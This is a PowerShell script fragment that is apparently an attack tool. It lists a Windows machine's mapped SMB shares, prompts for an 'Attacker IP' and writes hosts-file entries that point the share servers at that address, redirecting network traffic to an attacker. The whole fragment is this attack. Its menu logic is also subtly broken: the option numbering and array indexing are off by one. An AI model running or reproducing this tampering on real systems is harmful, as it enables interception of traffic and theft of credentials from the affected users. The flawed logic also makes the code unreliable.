    

   if ($sessionadmin -eq "False"){Write-Output "Not Running As Admin.....Cannot Change Host File"} else{
    
    $smbds = @((get-smbmapping).remotepath)

$smbcount = $smbds.Count
$optc = 0

Write-Output ""
Write-Output "Available Shares:"
Write-Output ""


foreach ($s in $smbds){

$optc++

Write-Output "$optc. $s"

}

$finalopt = $optc++
Write-Output "$optc.   Change All"

Write-Output ""

$whichshare = Read-Host -Prompt "Option Number"

$attkip = Read-Host -Prompt "Attacker IP"



if ($whichshare -eq $finalopt){

foreach($i in $smbds){

$srv = $i.Substring(0, $i.lastIndexOf('\'))
$srv = $srv.trim('\\')


try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "$attkip `t $srv"}catch{Write-Output "error occured"}

}


}

if ($whichshare -lt $finalopt){

$shre = $smbds[$whichshare]

try{Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "$attkip `t $shre"}catch{Write-Output "error occured"} 

}


if ($whichshare -gt $finalopt){ 

Write-Output "No option selected"

}



} #else

    

